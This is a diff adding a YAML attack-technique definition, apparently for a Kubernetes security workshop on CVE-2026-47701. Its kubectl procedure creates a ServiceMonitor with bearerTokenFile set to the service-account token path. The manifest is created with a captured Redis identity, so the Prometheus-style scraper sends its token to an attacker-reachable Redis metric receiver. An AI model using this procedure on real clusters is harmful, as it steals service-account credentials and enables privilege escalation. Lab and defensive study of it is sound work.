@@ -1,0 +1,87 @@
+id: create-servicemonitor-bearer-token-file
+name: Create ServiceMonitor with Bearer Token File
+description: >-
+  Create a namespaced ServiceMonitor that makes Prometheus-compatible
+  discovery read a bearer token from a file in the scraping workload. In the
+  CVE-2026-47701 workshop, run this as the captured Redis service account
+  after Redis code execution and target the Redis metric receiver service.
+tactic: Credential Access
+techniques: ["Steal Application Access Token", "T1528"]
+parameters:
+  K8S_AUTH:
+    type: K8sAuth
+    description: the captured identity authorized to create ServiceMonitors
+  NAMESPACE:
+    type: Namespace
+    default: ${NS}
+    description: the namespace in which to create the ServiceMonitor
+  SERVICEMONITOR_NAME:
+    type: string
+    default: redis-metrics
+    description: the name of the ServiceMonitor to create
+  SERVICEMONITOR_LABEL_KEY:
+    type: string
+    default: app.kubernetes.io/component
+    description: a label required by the target allocator's ServiceMonitor selector
+  SERVICEMONITOR_LABEL_VALUE:
+    type: string
+    default: redis-metrics
+    description: the value required by the target allocator's ServiceMonitor selector
+  SERVICE_LABEL_KEY:
+    type: string
+    default: app.kubernetes.io/name
+    description: the Service label key selected by the ServiceMonitor
+  SERVICE_LABEL_VALUE:
+    type: string
+    default: redis-metrics
+    description: the Service label value selected by the ServiceMonitor
+  PORT:
+    type: string
+    default: http
+    description: the named Service port to scrape
+  PATH:
+    type: string
+    default: /collect
+    description: the HTTP path to scrape
+  INTERVAL:
+    type: string
+    default: 5s
+    description: the Prometheus scrape interval
+  BEARER_TOKEN_FILE:
+    type: string
+    default: /var/run/secrets/kubernetes.io/serviceaccount/token
+    description: the token path to place in the ServiceMonitor endpoint
+procedures:
+  - key: kubectl
+    command: |
+      printf '%s\n' \
+        'apiVersion: monitoring.coreos.com/v1' \
+        'kind: ServiceMonitor' \
+        'metadata:' \
+        '  name: ${SERVICEMONITOR_NAME}' \
+        '  namespace: ${NAMESPACE}' \
+        '  labels:' \
+        '    "${SERVICEMONITOR_LABEL_KEY}": "${SERVICEMONITOR_LABEL_VALUE}"' \
+        'spec:' \
+        '  selector:' \
+        '    matchLabels:' \
+        '      "${SERVICE_LABEL_KEY}": "${SERVICE_LABEL_VALUE}"' \
+        '  endpoints:' \
+        '    - port: "${PORT}"' \
+        '      path: "${PATH}"' \
+        '      interval: "${INTERVAL}"' \
+        '      bearerTokenFile: "${BEARER_TOKEN_FILE}"' \
+      | kubectl ${K8S_AUTH} apply -f -
+preconditions:
+  kind: ServiceAccount
+  has-token: true
+  rbac:
+    - verb: create
+      resource: servicemonitors
+cleanup:
+  key: kubectl
+  command: >-
+    kubectl ${K8S_AUTH} delete servicemonitor ${SERVICEMONITOR_NAME}
+    --namespace=${NAMESPACE} --ignore-not-found
+references:
+  - https://github.com/Magier/Oopserability/blob/main/manifests/cve-2026-47701/README.md
